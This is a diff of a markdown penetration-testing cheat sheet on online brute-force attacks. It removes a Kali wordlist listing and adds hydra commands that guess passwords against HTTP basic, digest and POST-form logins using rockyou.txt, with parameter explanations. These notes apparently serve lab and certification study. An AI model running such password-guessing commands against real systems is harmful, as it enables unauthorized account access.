@@ -1,27 +1,5 @@
-# Online bruteforce
+# Bruteforce
 
-## Wordlists
-
-```bash
-cd /usr/share/wordlists/
-sudo gzip -d rockyou.txt.gz
-/usr/share/wordlists/rockyou.txt
-   
-/usr/share/wordlists
-├── dirb -> /usr/share/dirb/wordlists
-├── dirbuster -> /usr/share/dirbuster/wordlists
-├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
-├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
-├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
-├── john.lst -> /usr/share/john/password.lst
-├── legion -> /usr/share/legion/wordlists
-├── metasploit -> /usr/share/metasploit-framework/data/wordlists
-├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
-├── rockyou.txt
-├── sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
-├── wfuzz -> /usr/share/wfuzz/wordlist
-└── wifite.txt -> /usr/share/dict/wordlist-probable.txt
-```
 ## SSH
 
 ```bash
@@ -63,15 +41,30 @@ nxc ftp 192.168.150.202 -u itadmin -p /usr/share/wordlists/rockyou.txt --ignore-
 
 ### Hydra 
 
-```bash
-# POST login/password BODY
-hydra -l admin -P <passwordList> target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+**HTTP Basic Auth**
 
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
-
-# Basic auth b64 (Header Authorization: Basic)
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.174.201 http-get /
+```sh
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
 ```
+
+**HTTP Digest (Header Authorization: Basic)**
+
+```sh
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt Y.Y.Y.Y http-get /admin/
+```
+
+**HTTP POST Form**
+
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
+```
+
+Parameters
+
+- `-l <user>`: login with `user` name.
+- `-L <users-file>`: login with users from file.
+- `-P <passwords file>`: login with passwords from file.
+- `http-head | http-get | http-post-form`: service to attack.
 ### ffuf
 
 ``` bash
